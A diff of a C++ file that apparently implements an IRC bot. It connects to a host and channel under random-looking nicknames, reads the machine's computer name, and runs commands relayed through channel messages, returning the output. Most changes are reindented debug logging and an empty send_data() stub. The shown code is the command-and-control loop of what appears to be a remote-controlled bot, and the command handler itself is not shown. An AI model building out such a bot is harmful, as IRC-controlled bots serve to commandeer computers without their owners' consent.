@@ -51,6 +51,8 @@ boost::asio::io_service io_service;
 boost::asio::streambuf request;
 boost::asio::streambuf response;
 
+
+
 TCHAR nameBuf[MAX_COMPUTERNAME_LENGTH + 2];
 DWORD nameBufSize;
 
@@ -69,6 +71,12 @@ IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+
 char *writable;
 size_t starting_index = 0;
 std::string const LETTERS ="abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ",NUMBERS = "0123456789";
+
+void send_data()
+{
+
+}
+
 
 
 void IrcConnect(std::string HOST,std::string channel )
@@ -129,19 +137,19 @@ void IrcConnect(std::string HOST,std::string channel )
                             while (std::getline(response_stream, resev) && resev !="\r\n")
                                     {
                                         std::cout<<resev<<std::endl;
-            #ifdef D_LIB
-            logircConnect << LDEBUG <<"Received : \n\n"<<resev<<" \n";
-            logircConnect << LDEBUG <<"Received : "<<resev.length()<<" Bytes.\n";
-            #endif
+                                        #ifdef D_LIB
+                                        logircConnect << LDEBUG <<"Received : \n\n"<<resev<<" \n";
+                                        logircConnect << LDEBUG <<"Received : "<<resev.length()<<" Bytes.\n";
+                                        #endif
                                         int ping=resev.find("PING",starting_index);
                                         if (ping!=-1)
                                                 {
-            #ifdef D_LIB
-            logircConnect << LDEBUG << "Sending Pong  to: "<<HOST;
-            #endif
+                                                    #ifdef D_LIB
+                                                    logircConnect << LDEBUG << "Sending Pong  to: "<<HOST;
+                                                    #endif
                                                     request_stream << "PONG "<<HOST<<"\r\n";
                                                     boost::asio::write(socket, request);
-                                                    }
+                                                }
 
                                         //Rem to change this to come after while loop
                                         std::string message=resev;
@@ -150,18 +158,22 @@ void IrcConnect(std::string HOST,std::string channel )
                                         if (f!=-1)
                                                 {
                                                     cont=message.substr(f+valid.length());
-            #ifdef D_LIB
-            logircConnect << LDEBUG << "Assigning relayed message";
-            #endif
+                                        #ifdef D_LIB
+                                        logircConnect << LDEBUG << "Assigning relayed message";
+                                        #endif
                                                     cmd();
                                                     if (msg.length()>1)
                                                         {
-            #ifdef D_LIB
-            logircConnect << LDEBUG<< "Sending response msg";
-            #endif
+                                                            #ifdef D_LIB
+                                                            logircConnect << LDEBUG<< "Sending response msg";
+                                                            #endif
+
+
                                                             request_stream << msg<<"\r\n";
                                                             boost::asio::write(socket, request);
                                                             request.data();
+
+
                                                             #ifdef D_LIB
                                                             logircConnect << LDEBUG << "Clearing msg object";
                                                             #endif
